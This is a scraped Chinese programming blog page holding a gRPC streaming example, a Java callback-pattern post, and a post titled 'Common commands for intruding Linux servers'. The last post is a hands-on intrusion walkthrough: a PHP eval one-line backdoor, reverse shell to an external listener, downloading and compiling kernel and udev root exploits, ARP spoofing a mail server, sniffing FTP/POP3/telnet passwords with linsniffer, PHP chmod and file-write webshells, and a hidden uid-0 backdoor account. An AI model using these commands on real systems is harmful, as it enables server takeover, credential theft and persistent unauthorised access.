<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(HelloService)</span> <span class="title">GetStatus</span><span class="params">(req *pb.GetReq,stream pb.HelloService_GetStatusServer)</span> <span class="title">err</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++&#123;</span><br><span class="line">		stream.Send(&amp;pb.GetResp&#123;</span><br><span class="line">			Status: i,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">if</span> err:=stream.Context().Err();err!=<span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">"客户端关闭流..."</span>)</span><br><span class="line">			<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>grpc-web</code>访问流：<br>文档：<a href="https://github.com/grpc/grpc-web" target="_blank" rel="noopener">https://github.com/grpc/grpc-web</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> helloService= <span class="built_in">new</span> proto.mypackage.HelloServiceClient(<span class="string">'http://localhost:8080'</span>);</span><br><span class="line"><span class="keyword">var</span> getReq= <span class="built_in">new</span> proto.mypackage.GetReq();</span><br><span class="line">getReq.setMessage(msg);</span><br><span class="line"><span class="keyword">var</span> metadata = &#123;<span class="string">'custom-header-1'</span>: <span class="string">'value1'</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> stream = helloService.getStatus(getReq, metadata);</span><br><span class="line">stream.on(<span class="string">'data'</span>, function(response) &#123;</span><br><span class="line">  console.log(response.getStatus());</span><br><span class="line">&#125;);</span><br><span class="line">stream.on(<span class="string">'status'</span>, function(status) &#123;</span><br><span class="line">  console.log(status.code);</span><br><span class="line">  console.log(status.details);</span><br><span class="line">  console.log(status.metadata);</span><br><span class="line">&#125;);</span><br><span class="line">stream.on(<span class="string">'end'</span>, function(end) &#123;</span><br><span class="line">  <span class="comment">// stream end signal</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/26/使用Callable实现不同回调函数/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/使用Callable实现不同回调函数/" itemprop="url">使用Callable实现不同回调函数</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-26T09:09:04+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java-架构/" itemprop="url" rel="index">
                    <span itemprop="name">Java,架构</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>针对不同的场景，我们可能需要不同的回调，每一个回调操作是不同的</p>
<h1 id="定义回调操作抽象类"><a href="#定义回调操作抽象类" class="headerlink" title="定义回调操作抽象类"></a>定义回调操作抽象类</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Operation</span>&lt;<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">        <span class="comment">/** 内部具体的执行操作  */</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> V <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> HttpRequestException, IOException</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 执行完成后的回调 **/</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">done</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 内部进行一列的异常捕获，确保 run 函数 和 done函数 正常执行 **/</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> V <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> HttpRequestException </span>&#123;</span><br><span class="line">            <span class="keyword">boolean</span> thrown = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> run();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (HttpRequestException e) &#123;</span><br><span class="line">                thrown = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                thrown = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpRequestException(e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    done();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!thrown) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> HttpRequestException(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们定义一个 <code>call</code>函数，内部调用 <code>run</code> 和 <code>done</code>函数，这样我们可以针对不同的回调，我们可以继承此抽象类，实现不同 的 <code>done</code> 函数，来达到实现不同的回调操作,<code>run</code> 函数是调用者要实现的</p>
<h1 id="实现一个自由控制的关闭回调"><a href="#实现一个自由控制的关闭回调" class="headerlink" title="实现一个自由控制的关闭回调"></a>实现一个自由控制的关闭回调</h1><p>我们通过<code>ignoreCloseExceptions</code> 参数，来控制是否当 <code>done</code> 发生异常时，程序是忽略还是终止</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">CloseOperation</span>&lt;<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">Operation</span>&lt;<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Closeable closeable;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> ignoreCloseExceptions;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">CloseOperation</span><span class="params">(<span class="keyword">final</span> Closeable closeable, <span class="keyword">final</span> <span class="keyword">boolean</span> ignoreCloseExceptions)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.closeable = closeable;</span><br><span class="line">            <span class="keyword">this</span>.ignoreCloseExceptions = ignoreCloseExceptions;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">done</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (closeable <span class="keyword">instanceof</span> Flushable) &#123;</span><br><span class="line">                ((Flushable) closeable).flush();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ignoreCloseExceptions) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    closeable.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="comment">// Ignored，如果发生异常了，程序继续执行，会忽略掉此异常</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            	<span class="comment">// 如果发生异常了，此时程序会退出</span></span><br><span class="line">                closeable.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="实现一个流刷新操作，确保流正常刷新到底层"><a href="#实现一个流刷新操作，确保流正常刷新到底层" class="headerlink" title="实现一个流刷新操作，确保流正常刷新到底层"></a>实现一个流刷新操作，确保流正常刷新到底层</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FlushOperation</span>&lt;<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">Operation</span>&lt;<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Flushable flushable;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">FlushOperation</span><span class="params">(<span class="keyword">final</span> Flushable flushable)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.flushable = flushable;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">done</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            flushable.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> CloseOperation&lt;HttpRequest&gt;(reader, ignoreCloseExceptions) &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HttpRequest <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> copy(reader, writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;.call();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FlushOperation&lt;HttpRequest&gt;(writer) &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> HttpRequest <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> copy(input, writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;.call();</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/25/入侵Linux服务器常用命令/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/25/入侵Linux服务器常用命令/" itemprop="url">入侵Linux服务器常用命令</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-25T10:10:04+08:00">
                2019-03-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux-渗透/" itemprop="url" rel="index">
                    <span itemprop="name">Linux,渗透</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="写个php一句话后门上去："><a href="#写个php一句话后门上去：" class="headerlink" title="写个php一句话后门上去："></a>写个php一句话后门上去：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -e <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>[md5])?&gt;"</span> &gt;rankuplog_time.php</span><br><span class="line">​$ cat rankuplog_time.php</span><br></pre></td></tr></table></figure>

<p>1.linux的想着先跨站。</p>
<p>shell浏览目标站不行，命令行下输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /www.users/</span><br></pre></td></tr></table></figure>

<p>2.溢出提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python –c ‘impotr pty;pty.spawn(“/bin/sh”);</span></span><br></pre></td></tr></table></figure>

<p>来得到交互的Shell,一般的系统都默认安装python</p>
<p><strong>输入id</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash-3.2$ id</span><br><span class="line">uid=529(zeicom) gid=525(zeicom) groups=525(zeicom)</span><br><span class="line">bash-3.2$</span><br></pre></td></tr></table></figure>

<p>这里uid=529(zeicom)还不是root权限，</p>
<p><strong>输入uname –r</strong><br>返回：2.6.18-164.11.1.el5PAE</p>
<h2 id="2-Linux提权大致可分为"><a href="#2-Linux提权大致可分为" class="headerlink" title="2. Linux提权大致可分为"></a>2. Linux提权大致可分为</h2><ul>
<li>第三方软件漏洞</li>
<li>本地信任特性</li>
<li>内核溢出</li>
</ul>
<h3 id="找对应的exp"><a href="#找对应的exp" class="headerlink" title="找对应的exp"></a>找对应的exp</h3><p>这里地址整理很齐全可以这里下</p>
<ul>
<li><a href="http://tools.90sec.org/" target="_blank" rel="noopener">http://tools.90sec.org/</a></li>
<li><a href="http://sebug.net/paper/linux_exp/" target="_blank" rel="noopener">http://sebug.net/paper/linux_exp/</a></li>
<li><a href="http://x73.cc/bitch/exp/" target="_blank" rel="noopener">http://x73.cc/bitch/exp/</a></li>
<li><a href="http://www.exploit-db.com/search/" target="_blank" rel="noopener">http://www.exploit-db.com/search/</a></li>
</ul>
<hr>
<ol>
<li>命令输入pwd,这个命令是显示当前目录，</li>
<li>先看能不能编译  gcc -help</li>
<li>当前目录就是shell的目录，我在shell上传2.c</li>
<li>反弹shell  到外网自己机器的12345端口  </li>
<li>上外网服务器 本地监听 nc -lvvp 12345</li>
</ol>
<p>一般都能得到一个apache交互的shell 有时候又不行</p>
<p>这时候  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python -c  impotr pty;pty.spawn("/bin/sh");</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 进入tmp目录 </span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"># 创建一个Papers的目录 Papers不显眼        </span><br><span class="line"><span class="built_in">mkdir</span> Papers   </span><br><span class="line"># 进入 Papers目录</span><br><span class="line"><span class="built_in">cd</span> Papers      </span><br><span class="line"># 查看当前目录   </span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

<p>然后命令输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 下载exp的URL</span><br></pre></td></tr></table></figure>

<p> 把2.c编译成可执行文件 g++ keio.cc -o keio</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc –o 2 2.c</span><br></pre></td></tr></table></figure>

<p>给2有执行权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 2</span><br></pre></td></tr></table></figure>

<p>执行2,  溢出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./2</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I/usr/local/include -L/usr/local/lib -o arpsniffer arpsniffer.c -lpcap -lnet</span><br></pre></td></tr></table></figure>

<p>确定arpsniffer.c需要先装pcap和 libnet。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh libnet-1.1.2.1-2.1.fc2.rf.i386.rpm</span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">wget http://downloads.sourceforge.net/libpcap/libpcap-0.8.1.tar.gz?modtime=1072656000&amp;big_mirror=0</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar zxvf libpcap-0.8.1.tar.gz</span><br><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> libpcap-0.8.1</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">./configure</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">make</span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>重新编译arpsniffer.c<br>再次执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I/usr/<span class="built_in">local</span>/include -L/usr/<span class="built_in">local</span>/lib -o arpsniffer arpsniffer.c -lpcap -lnet</span><br></pre></td></tr></table></figure>

<p>这次没报错，编译成功。<br>运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./arpsniffer -I eth0 -M 192.168.0.6 -W 192.168.0.4 -S 192.168.0.254</span><br></pre></td></tr></table></figure>

<h1 id="3-下面开始欺骗"><a href="#3-下面开始欺骗" class="headerlink" title="3. 下面开始欺骗"></a>3. 下面开始欺骗</h1><p>由于是服务器端，因此我们欺骗网关：<br>（网络环境如下，邮件服务器ip：192.168.0.11 网关：192.168.0.1 本机：192.168.0.77）<br>执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./arpsniffer -I eth0 -M 192.168.0.77 -W 192.168.0.1 -S 192.168.0.11 -P 110</span><br></pre></td></tr></table></figure>

<p>在另一个登录里面用tcpdump监听下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 host 192.168.0.11</span><br></pre></td></tr></table></figure>

<p>发现有数据，把监听的数据存在文件里面：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 host 172.16.0.12 -w pop.txt</span><br></pre></td></tr></table></figure>

<p>10分钟后停止，在SecureCRT下用sz命令下载pop.txt到本地，然后用Ethereal分析。</p>
<p>下面我们就可以用linsniffer监听我们想要的用户名和密码了。</p>
<p>先修改linsniffer.c：根据自己的需求监听相应的应用密码。我的如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==21)  p=1; /* ftp */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==22)  p=1; /* ssh <span class="keyword">for</span> comparison added <span class="keyword">for</span> example only comment out <span class="keyword">if</span> desired*/</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==23)  p=1; /* telnet */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==80) p=1;  /* http */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==110) p=1; /* pop3 */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==513) p=1; /* rlogin */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==106) p=1; /* poppasswd */</span><br></pre></td></tr></table></figure>

<p>编译执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@pibigstar root]<span class="comment"># gcc -o linsniffer linsniffer.c</span></span><br></pre></td></tr></table></figure>

<p>会提示下面</p>
<blockquote>
<p>In file included from /usr/include/linux/tcp.h:21,<br>from linsniffer.c:32:<br>/usr/include/asm/byteorder.h:6:2: warning: #warning using private kernel header; include &lt;endian.h&gt; instead!</p>
</blockquote>
<p>不用管警告，直接运行编译后的linsniffer即可。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@pibigstar root]<span class="comment"># ./linsniffer</span></span><br></pre></td></tr></table></figure>

<p>用户名和密码都自动存到了tcp.log下。</p>
<h1 id="4-利用跨站代码"><a href="#4-利用跨站代码" class="headerlink" title="4.利用跨站代码"></a>4.利用跨站代码</h1><p>linux不提权跨目录访问的代码 </p>
<p>linux权限多设的比较松的其实，但有的虚拟机还是不能跨目录访问的。</p>
<p>在提不了权的情况下，试试如下代码吧。运气好的话说不定就跨过去了。</p>
<p>代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path</span> = stripslashes(<span class="variable">$_GET</span>[ path ]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ok</span> = chmod (<span class="variable">$path</span> , 0777);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ok</span> == <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> CHMOD OK , Permission editable file or directory. Permission to write;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>把上面代码保存为tmdsb.PHP</p>
<p>然后访问<a href="http://www.tmdsb.com/tmdsb.php?path=../../要跨的目录/index.php" target="_blank" rel="noopener">http://www.tmdsb.com/tmdsb.php?path=../../要跨的目录/index.php</a></p>
<p>这里的index.PHP是要修改权限的文件。</p>
<p>收集的另一个exp：</p>
<p>把下面的代码保存为exp.PHP</p>
<p>代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$filename</span> = stripslashes(<span class="variable">$_POST</span>[ filename ]);</span><br><span class="line"></span><br><span class="line">@<span class="variable">$mess</span> = stripslashes(<span class="variable">$_POST</span>[ mess ]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = @fopen(&#123;<span class="variable">$_POST</span>[ filename ]&#125;,  a );</span><br><span class="line"></span><br><span class="line">@fputs(<span class="variable">$fp</span>,<span class="variable">$mess</span> </span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最终Linux Kernel &lt; 2.6.19 udp_sendmsg Local Root Exploit (x86/x64)这个0day溢出成功</p>
<h1 id="5-udev提权"><a href="#5-udev提权" class="headerlink" title="5. udev提权"></a>5. udev提权</h1><p>换了个udev提权，适用于内核范围为2.6.*。</p>
<p>还是上传文件至服务器shell所在目录，执行命令ls，发现文件已经躺在那里面了，之后赋予exp执行权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod +x pwnkernel.c</span><br><span class="line"></span><br><span class="line">chmod +x wunderbar_emporium.sh</span><br><span class="line"></span><br><span class="line">chmod +x exploit.c</span><br></pre></td></tr></table></figure>

<p>之后执行<code>./w*</code>溢出</p>
<p>成功溢出，root权限。</p>
<p>之后就是留下一个后门~ 添加一个root权限用户俺也不介意。。。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -u 0 -o <span class="string">"username"</span></span><br></pre></td></tr></table></figure>

<p>依次输入命令</p>
